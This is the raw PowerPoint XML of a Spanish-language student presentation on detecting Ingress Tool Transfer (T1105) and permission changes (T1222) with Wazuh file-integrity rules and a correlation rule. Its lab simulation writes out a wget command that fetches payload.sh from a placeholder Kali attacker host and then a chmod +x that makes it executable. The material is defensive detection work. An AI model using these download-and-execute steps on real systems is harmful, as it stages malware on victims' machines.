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  <p:embeddedFont>
      <p:font typeface="Urbanist Medium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udlaec-my.sharepoint.com/personal/ariel_pulles_udla_edu_ec/_layouts/15/stream.aspx?id=/personal/ariel_pulles_udla_edu_ec/Documents/VideoWazuh.mp4&amp;nav=eyJyZWZlcnJhbEluZm8iOnsicmVmZXJyYWxBcHAiOiJPbmVEcml2ZUZvckJ1c2luZXNzIiwicmVmZXJyYWxBcHBQbGF0Zm9ybSI6IldlYiIsInJlZmVycmFsTW9kZSI6InZpZXciLCJyZWZlcnJhbFZpZXciOiJNeUZpbGVzTGlua0NvcHkifX0&amp;ga=1&amp;referrer=StreamWebApp.Web&amp;referrerScenario=AddressBarCopied.view.47d0d750-882d-4fee-ad8b-d0324e24647c" TargetMode="External"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image31.jpeg"/><Relationship Id="rId5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600200"/>
            <a:ext cx="11581447" cy="1777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MITRE ATT&amp;CK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250" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0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T1105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076450" y="4038600"/>
            <a:ext cx="80391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Validación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Correlación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Alertas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Seguridad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Wazuh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para Sistemas </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="180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Operativos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190875" y="4857750"/>
            <a:ext cx="581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Por: Ariel Pulles, Oswaldo Masacre, Pavel Valencia, Martín Mosquera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76425"/>
            <a:ext cx="52292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Contexto del </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375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Ataque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1900237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Ingress Tool Transfer (T1105)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2452687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Esta táctica describe cómo los adversarios transfieren herramientas o archivos maliciosos desde sistemas externos hacia un entorno comprometido.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3452812"/>
            <a:ext cx="522922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Grupos APT, como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Lazarus Group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utilizan herramientas nativas del sistema (Living-off-the-Land) como wget o curl para evadir la detección inicial.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4462462"/>
            <a:ext cx="522922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 combinar esta técnica con la modificación de permisos (T1222) mediante chmod, los atacantes logran preparar sus payloads para ejecución y persistencia.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85950"/>
            <a:ext cx="5210175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Objetivos del </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375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Proyecto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857375" y="1762125"/>
            <a:ext cx="900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Monitorear Rutas Críticas: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Configurar Wazuh FIM para vigilar en tiempo real directorios sensibles propensos a descargas temporales (/etc, /tmp).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857375" y="2724150"/>
            <a:ext cx="900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Detectar Transferencias (T1105):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Identificar la creación no autorizada de archivos mediante herramientas nativas.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857375" y="3686175"/>
            <a:ext cx="900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Detectar Escalada (T1222):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Alertar sobre la modificación de permisos (ej. concesión de permisos de ejecución) en archivos sospechosos.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857375" y="4648200"/>
            <a:ext cx="900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Correlación de Eventos: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Implementar lógica avanzada en Wazuh para elevar la severidad si ambos eventos ocurren de forma secuencial.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177641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273843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700462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662487"/>
            <a:ext cx="3619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81200"/>
            <a:ext cx="34861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981200"/>
            <a:ext cx="34861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981200"/>
            <a:ext cx="348615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Entorno e </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375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Infraestructura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76300" y="3124200"/>
            <a:ext cx="136017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SIEM / XDR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76300" y="3571875"/>
            <a:ext cx="28956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Servidor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Wazuh versión 4.12.0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(IP: 192.168.159.144). Encargado de la recolección, indexación y procesamiento de las reglas personalizadas.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48200" y="3124200"/>
            <a:ext cx="202025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Endpoint Víctima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8200" y="3571875"/>
            <a:ext cx="28956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Máquina virtual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Ubuntu Linux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(IP: 192.168.159.129) con el agente de Wazuh instalado y configurado para auditoría FIM.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20100" y="3124200"/>
            <a:ext cx="21002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Entorno Atacante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20100" y="3571875"/>
            <a:ext cx="28956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Máquina virtual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Kali Linux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configurada con un servidor HTTP en Python para alojar y distribuir el payload simulado.</a:t>
            </a:r>
            <a:endParaRPr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40982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409825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409825"/>
            <a:ext cx="4857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66925"/>
            <a:ext cx="532447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66925"/>
            <a:ext cx="532447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3771900"/>
            <a:ext cx="45434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Configuración del </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375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Agente (FIM)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71550" y="2552700"/>
            <a:ext cx="477059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Monitoreo en Tiempo Real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71550" y="3095625"/>
            <a:ext cx="45434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Para garantizar la captura inmediata de los eventos, se modificó el archivo ossec.conf del agente Ubuntu.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71550" y="3819525"/>
            <a:ext cx="45434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 habilitó el escaneo "realtime" específicamente para los directorios críticos del sistema donde comúnmente se descargan archivos temporales.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677025" y="2600325"/>
            <a:ext cx="477059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Código de Implementación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677025" y="3143250"/>
            <a:ext cx="45434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Directiva añadida en la sección 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76425"/>
            <a:ext cx="52292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Desarrollo de Reglas: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375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Detección Base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33425" y="210978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71525" y="2109787"/>
            <a:ext cx="503872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Regla 1000001 (T1105):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 dispara cuando Syscheck reporta la creación de un archivo nuevo (SID 554) dentro de /etc/, /tmp/, etc.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33425" y="31670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71525" y="3167062"/>
            <a:ext cx="50387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Regla 1000002 (T1222):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Detecta eventos de modificación de permisos y atributos (SID 550, 552) en las mismas rutas críticas.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33425" y="42148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71525" y="4214812"/>
            <a:ext cx="50387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Ambas reglas fueron configuradas con un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Nivel de Severidad 12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(Alto), indicando un comportamiento anómalo que requiere investigación.</a:t>
            </a:r>
            <a:endParaRPr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85950"/>
            <a:ext cx="5210175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Correlación: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375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Alerta Crítica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81025" y="2619226"/>
            <a:ext cx="441186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60s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81025" y="4428976"/>
            <a:ext cx="44118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Ventana de Tiempo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564385" y="1915715"/>
            <a:ext cx="63489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Regla Maestra: 1000003 (Nivel 14)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564385" y="2611040"/>
            <a:ext cx="6046589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Esta regla correlaciona los eventos anteriores. Utiliza la etiqueta syscheck.path para asegurar que hablamos del mismo archivo.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564385" y="3850927"/>
            <a:ext cx="6046589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 la descarga del archivo (1000001) y el cambio de permisos de ejecución (1000002) ocurren en la misma ruta en un lapso máximo de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60 segundos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se genera una alerta Crítica de preparación de Malware.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Simulación del </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375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Ataque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81025" y="3857625"/>
            <a:ext cx="1102995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98302" y="4210050"/>
            <a:ext cx="34743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1. Preparación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81025" y="4629150"/>
            <a:ext cx="330889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 Kali Linux, se inicia un servidor web rápido: python3 -m http.server 8080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4358755" y="1952625"/>
            <a:ext cx="34743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2. Ingress (T1105)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4441477" y="2371725"/>
            <a:ext cx="330889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Desde Ubuntu, se simula la descarga remota: wget http://[IP_KALI]:8080/payload.sh -O /tmp/payload.sh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219208" y="4210050"/>
            <a:ext cx="34743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3. Escalada (T1222)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301930" y="4629150"/>
            <a:ext cx="330889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Inmediatamente se conceden privilegios de ejecución: chmod +x /tmp/payload.sh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2121172" y="37623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0505"/>
          </a:solidFill>
          <a:ln w="38100" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="00FF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981625" y="37623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0505"/>
          </a:solidFill>
          <a:ln w="38100" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="00FF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9842078" y="37623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0505"/>
          </a:solidFill>
          <a:ln w="38100" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="00FF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75519"/>
            <a:ext cx="3486150" cy="3821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775519"/>
            <a:ext cx="3486150" cy="3821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775519"/>
            <a:ext cx="3486150" cy="382116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Validación de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375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Resultados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753903" y="4166294"/>
            <a:ext cx="314039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Ejecución Exitosa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828675" y="4566344"/>
            <a:ext cx="29908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Los comandos de descarga y permisos se ejecutaron en el entorno sin bloqueos iniciales, simulando un ataque exitoso.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525803" y="4166294"/>
            <a:ext cx="314039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Detección FIM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600575" y="4566344"/>
            <a:ext cx="29908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Syscheck registró los eventos de manera secuencial, generando logs precisos de alta de inodo y modificación de atributos.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8297703" y="4166294"/>
            <a:ext cx="314039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Alerta Crítica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372475" y="4566344"/>
            <a:ext cx="29908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Dashboard reflejó inmediatamente la Regla 1000003 en el panel de Threat Intelligence (MITRE ATT&amp;CK).</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="202" name="Google Shape;20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8675" y="2023169"/>
            <a:ext cx="29908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0575" y="2023169"/>
            <a:ext cx="29908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72475" y="2023169"/>
            <a:ext cx="29908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81200"/>
            <a:ext cx="34861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981200"/>
            <a:ext cx="34861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981200"/>
            <a:ext cx="348615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Conclusiones del </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1" i="0" u="none" strike="noStrike" cap="non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Estudio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876300" y="3124200"/>
            <a:ext cx="23102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Reducción de Ruido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876300" y="3571875"/>
            <a:ext cx="28956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implementación de reglas correlacionadas eleva significativamente la fiabilidad de las alertas, reduciendo los falsos positivos por descargas legítimas.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4648200" y="3124200"/>
            <a:ext cx="245030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Flexibilidad del SIEM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4648200" y="3571875"/>
            <a:ext cx="28956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Wazuh demostró ser una plataforma altamente versátil, capaz de modelar comportamientos complejos mediante secuencias lógicas a nivel de sistema de archivos.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8420100" y="3124200"/>
            <a:ext cx="217027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Validación Exitosa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420100" y="3571875"/>
            <a:ext cx="28956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 logró comprobar el funcionamiento de las detecciones en tiempo real (Ingress Tool Transfer y Modificación de Permisos) en un entorno controlado.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="220" name="Google Shape;22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40982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409825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409825"/>
            <a:ext cx="3714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Recomendaciones</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="229" name="Google Shape;229;p23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1857375" y="2085975"/>
            <a:ext cx="900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Afinamiento (White-listing):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 sugiere evaluar la inclusión de reglas de exclusión para procesos de actualización legítimos (ej. apt, dpkg) que puedan simular estos eventos.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1857375" y="3048000"/>
            <a:ext cx="90011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Respuesta Activa (Active Response):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Diseñar una configuración en Wazuh que reaccione automáticamente bloqueando la IP o eliminando el archivo sospechoso al dispararse la regla nivel 14.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857375" y="4324350"/>
            <a:ext cx="900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Integración de Auditoría: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Complementar el monitoreo FIM con la auditoría de comandos a nivel de kernel (Auditd / Journald) para obtener visibilidad total del usuario que ejecutó el binario.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="232" name="Google Shape;23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10026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062287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338637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305276" y="581025"/>
            <a:ext cx="11581447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 dirty="0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VIDEO DEMOSTRATIVO</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="243" name="Google Shape;24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6889" y="2200275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Online Media 2" title="VideoWazuh.mp4">
            <a:hlinkClick r:id="" action="ppaction://media"/>
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E787BBB3-1BC3-4572-4306-A15A9E0F807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1927122" y="1619250"/>
            <a:ext cx="7836310" cy="44079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818</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>65</Paragraphs>
  <Slides>12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Urbanist Medium</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Urbanist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 Mosquera</dc:creator>
  <cp:lastModifiedBy>(Estudiante) Martin Alexander Mosquera Carrera</cp:lastModifiedBy>
  <cp:revision>5</cp:revision>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-06-23T00:08:57Z</dcterms:modified>
</cp:coreProperties>
</file>